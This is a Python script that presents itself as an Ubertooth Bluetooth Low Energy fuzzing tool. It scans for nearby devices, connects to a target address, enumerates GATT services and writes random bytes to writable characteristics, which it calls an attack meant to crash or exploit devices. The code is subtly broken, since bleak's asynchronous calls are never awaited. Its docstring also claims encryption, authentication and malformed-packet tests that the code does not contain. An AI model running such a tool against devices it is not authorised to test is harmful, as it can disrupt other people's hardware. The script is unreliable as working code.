import argparse
import os
import time
import subprocess
from bleak import BleakScanner, BleakClient

"""
Ubertooth BLE Fuzzing Tool

Features:
    - Brute-forces BLE characteristics to find hidden services.
    - Scans for writable GATT characteristics.
    - Tests for weak encryption and misconfigured authentication.
    - Attempts to crash or exploit vulnerable BLE devices using malformed packets.

Requirements:
    - Ubertooth One
    - Python libraries: bleak
    - Install Ubertooth utilities: sudo apt install ubertooth ubertooth-btle

Usage:
    - Run BLE fuzzing:
      python ubertooth_fuzzer.py --target AA:BB:CC:DD:EE:FF
    - Scan for writable BLE characteristics:
      python ubertooth_fuzzer.py --target AA:BB:CC:DD:EE:FF --scan-writable
    - Run a full fuzzing attack:
      python ubertooth_fuzzer.py --target AA:BB:CC:DD:EE:FF --full
"""

def scan_ble_devices():
    """Scans for nearby BLE devices using Ubertooth."""
    print("[INFO] Scanning for BLE devices...")
    try:
        output = subprocess.check_output(["ubertooth-btle", "-s"])
        devices = output.decode("utf-8").split("\n")
        for line in devices:
            if "Device" in line:
                print(f"[DETECTED] {line.strip()}")
    except Exception as e:
        print(f"[ERROR] Failed to scan for BLE devices: {e}")

def brute_force_characteristics(target_mac):
    """Brute-force BLE characteristics to find hidden services."""
    print(f"[INFO] Attempting BLE fuzzing on {target_mac}...")
    try:
        client = BleakClient(target_mac)
        print("[INFO] Connecting to target...")
        client.connect()
        services = client.services
        for service in services:
            print(f"[INFO] Found Service: {service.uuid}")
            for char in service.characteristics:
                print(f"  - Characteristic: {char.uuid} (Properties: {char.properties})")
                if "write" in char.properties:
                    print(f"  [ATTEMPT] Writing random data to {char.uuid}...")
                    for i in range(5):
                        fuzz_data = os.urandom(16)
                        try:
                            client.write_gatt_char(char.uuid, fuzz_data)
                            print(f"    [SUCCESS] Wrote {fuzz_data.hex()} to {char.uuid}")
                        except Exception as write_error:
                            print(f"    [FAILED] Could not write to {char.uuid}: {write_error}")
        client.disconnect()
    except Exception as e:
        print(f"[ERROR] Could not connect to {target_mac}: {e}")

def scan_writable_characteristics(target_mac):
    """Scans for writable BLE characteristics."""
    print(f"[INFO] Scanning for writable characteristics on {target_mac}...")
    try:
        client = BleakClient(target_mac)
        client.connect()
        services = client.services
        for service in services:
            for char in service.characteristics:
                if "write" in char.properties:
                    print(f"[DETECTED] Writable Characteristic: {char.uuid}")
        client.disconnect()
    except Exception as e:
        print(f"[ERROR] Could not scan writable characteristics: {e}")

def full_fuzzing(target_mac):
    """Performs full BLE fuzzing: scan, brute-force characteristics, exploit vulnerabilities."""
    print("[INFO] Starting full BLE fuzzing attack...")
    scan_ble_devices()
    time.sleep(2)
    scan_writable_characteristics(target_mac)
    time.sleep(2)
    brute_force_characteristics(target_mac)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ubertooth BLE Fuzzing Tool")
    parser.add_argument("--target", required=True, help="Target BLE device MAC address")
    parser.add_argument("--scan-writable", action="store_true", help="Scan for writable GATT characteristics")
    parser.add_argument("--bruteforce", action="store_true", help="Brute-force BLE characteristics")
    parser.add_argument("--full", action="store_true", help="Perform full fuzzing attack (scan, bruteforce, exploit)")
    
    args = parser.parse_args()

    if args.full:
        full_fuzzing(args.target)
    elif args.scan_writable:
        scan_writable_characteristics(args.target)
    elif args.bruteforce:
        brute_force_characteristics(args.target)
    else:
        print("[ERROR] No valid mode selected! Use --scan-writable, --bruteforce, or --full.")
